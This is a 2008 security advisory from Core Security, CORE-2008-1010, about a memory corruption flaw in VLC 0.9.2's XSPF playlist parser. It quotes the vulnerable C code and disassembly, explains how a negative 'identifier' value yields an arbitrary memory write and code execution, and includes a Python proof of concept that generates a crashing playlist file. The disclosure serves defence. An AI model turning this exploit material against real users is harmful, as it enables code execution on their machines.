@@ -1,0 +1,292 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+         VLC media player XSPF Memory Corruption
+
+
+1. *Advisory Information*
+
+Title: VLC media player XSPF Memory Corruption
+Advisory ID: CORE-2008-1010
+Advisory URL: http://www.coresecurity.com/content/vlc-xspf-memory-corruption
+Date published: 2008-10-14
+Date of last update: 2008-10-14
+Vendors contacted: VLC
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Memory corruption
+Remotely Exploitable: Yes (client side)
+Locally Exploitable: No
+Bugtraq ID: N/A
+CVE Name: N/A
+
+
+3. *Vulnerability Description*
+
+VLC media player is an open-source, highly portable multimedia player
+for various audio and video formats, as well as DVDs, VCDs, and various
+streaming protocols. It can also be used as a server to stream in
+unicast or multicast in IPv4 or IPv6 on a high-bandwidth network.
+
+VLC media player is vulnerable to a memory corruption vulnerability,
+which can be exploited by malicious remote attackers to compromise a
+user's system, by providing a specially crafted XSPF playlist file. The
+vulnerability exists because the VLC ('demux/playlist/xspf.c') library
+does not properly perform bounds-checking on an 'identifier' tag from an
+XSPF file before using it to index an array on the heap. This can be
+exploited to overwrite an arbitrary memory address in the context of the
+VLC media player process, and eventually get arbitrary code execution by
+opening a specially crafted file.
+
+
+4. *Vulnerable packages*
+
+   . VLC media player 0.9.2
+
+
+5. *Non-vulnerable packages*
+
+   . VLC media player 0.9.3 (no official binary files available for
+Windows platform)
+   . VLC media player 0.9.4
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+Update to VLC media player 0.9.4, available at
+http://www.videolan.org/vlc/.
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon
+from Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+VLC media player has support for the XML-based XSPF playlist format [1].
+Every track in an XSPF playlist has a number of attributes, such as
+'identifier, location, title and duration'. The 'identifier' attribute
+is a numeric value that indicates the position of the track in the
+tracklist. Here's a sample playlist in XSPF format:
+
+/-----------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<playlist version="1" xmlns="http://xspf.org/ns/0/">
+	<title>Sample playlist</title>
+	<location>C:\my-playlist.xspf</location>
+	<trackList>
+		<track>
+			<identifier>0</identifier>
+			<location>C:\My%20music\track1.mp3</location>
+			<extension application="http://www.videolan.org/vlc/playlist/0">
+			</extension>
+			<duration>239099</duration>
+		</track>
+		<track>
+			<identifier>1</identifier>
+			<location>C:\My%20music\track2.mp3</location>
+		</track>
+		<track>
+			<identifier>2</identifier>
+			<location>C:\My%20music\track3.mp3</location>
+		</track>
+	</trackList>
+	<extension application="http://www.videolan.org/vlc/playlist/0">
+		<item href="0" />
+		<item href="1" />
+		<item href="2" />
+	</extension>
+</playlist>
+
+- -----------/
+
+ VLC media player's XSPF playlist format parser
+('demux/playlist/xspf.c') does not properly perform bounds-checking
+before using the 'identifier' attribute value to index an array on the
+heap to write data on it.
+
+In the first place, the parser reads the 'identifier' attribute of a
+track and converts its value to 'int' type using the 'atoi' function
+from the standard C library, and saves it to the 'i_identifier' field of
+a 'demux_sys_t' structure:
+
+/-----------
+
+575            else if( !strcmp( p_handler->name, "identifier" ) )
+576             {
+577                 p_demux->p_sys->i_identifier = atoi( psz_value );
+578             }
+
+- -----------/
+
+ After that, at lines 501-502, the parser compares 'i_identifier' with
+'i_tracklist_entries'. This last field is a counter that holds the
+number of tracklist entries that were successfully parsed at the moment.
+
+If 'i_identifier' is less than 'i_tracklist_entries', the value of
+'i_identifier' is used to index the 'pp_tracklist' array, and
+'p_new_input' is written on that position (at line '505').
+
+/-----------
+
+501		if( p_demux->p_sys->i_identifier <
+502                      p_demux->p_sys->i_tracklist_entries )
+503                 {
+504                     p_demux->p_sys->pp_tracklist[
+505                         p_demux->p_sys->i_identifier ] = p_new_input;
+506                 }
+
+- -----------/
+
+ Since the XSPF parser does not perform bounds-checking before indexing
+the array to write on it, and having 'i_identifier' fully controlled by
+the user, an attacker may overwrite almost any memory address with
+'p_new_input'.
+
+This is the disassembled vulnerable code:
+
+/-----------
+
+70246981   .  39C2          CMP EDX,EAX                              ;
+i_identifier < i_tracklist_entries?
+70246983   .  7D 29         JGE SHORT libplayl.702469AE
+70246985   .  8B2B          MOV EBP,DWORD PTR DS:[EBX]               ;
+EBP = pp_tracklist = 0
+70246987   .  8B7C24 44     MOV EDI,DWORD PTR SS:[ESP+44]            ;
+EDI = p_new_input
+7024698B   .  897C95 00     MOV DWORD PTR SS:[EBP+EDX*4],EDI         ;
+Saves p_new_input in pp_tracklist[i_identifier]
+
+- -----------/
+
+ At this point, when parsing the first track of the playlist,
+'i_tracklist_entries' value is 0. The parser performs a signed
+comparison between 'i_identifier' and 'i_tracklist_entries', so by
+providing a negative value for 'i_identifier', an attacker can avoid
+that conditional JGE jump to be executed. After that, EBP is always 0
+and the attacker controls EDX, so he can write 'p_new_input' to almost
+any memory address aligned to a 4-byte boundary. 'p_new_input' is a
+pointer to a structure of type 'input_item_t', that holds information
+about the playlist item being processed. At 'p_new_input + 0x10' there
+is a pointer to the track filename (provided by the 'location'
+attribute), excluding the path.
+
+This track filename (which is UTF-8 encoded) is controlled by the user
+too, so if an attacker overwrites a specially chosen memory address and
+the program executes some instructions that load 'p_new_input' into a
+CPU register and perform an indirect call like 'CALL DWORD[R32 + 0x10]'
+(where R32 is a 32-bit register), it will be possible to get arbitrary
+code execution with the privileges of the current user.
+
+The following Python code will generate an XSPF file that, when opened
+with VLC media player 0.9.2, will crash the application when trying to
+write 'p_new_input' to memory address 41424344.
+
+/-----------
+
+xspf_file_content = '''
+<?xml version="1.0" encoding="UTF-8"?>
+<playlist version="1" xmlns="http://xspf.org/ns/0/">
+<title>XSPF PoC</title>
+<location>C:\My%20Music\playlist.xspf</location>
+<trackList>
+<track>
+<identifier>-1873768239</identifier>
+<location>C:\My%20Music\Track1.mp3</location>
+<extension application="http://www.videolan.org/vlc/playlist/0">
+</extension>
+<duration>239099</duration>
+</track>
+</trackList>
+<extension application="http://www.videolan.org/vlc/playlist/0">
+<item href="0" />
+</extension>
+</playlist>
+'''
+
+crafted_xspf_file = open('playlist.xspf','w')
+crafted_xspf_file.write(xspf_file_content)
+crafted_xspf_file.close()
+
+- -----------/
+
+
+9. *Report Timeline*
+
+2008-10-10: Core Security Technologies notifies the VLC team of the
+vulnerability, and that the advisory CORE-2008-1010 will be published on
+October 14th, since the vulnerability is already fixed in VLC versions
+0.9.3 and 0.9.4.
+2008-10-12: VLC team confirms that the vulnerability has been fixed (the
+vulnerability was discovered and fixed by the VLC team on September 15th).
+2008-10-14: Advisory CORE-2008-1010 is published.
+
+
+10. *References*
+
+[1] XSPF format http://www.xspf.org/
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2008 Core Security
+Technologies and (c) 2008 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkj1DEkACgkQyNibggitWa2M+ACghrS9hKB5saDl3ufp69iJ46P5
+DHoAn2Ygu5INc0u2P+tW+m+JZATCFXp0
+=LilF
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-10-14]
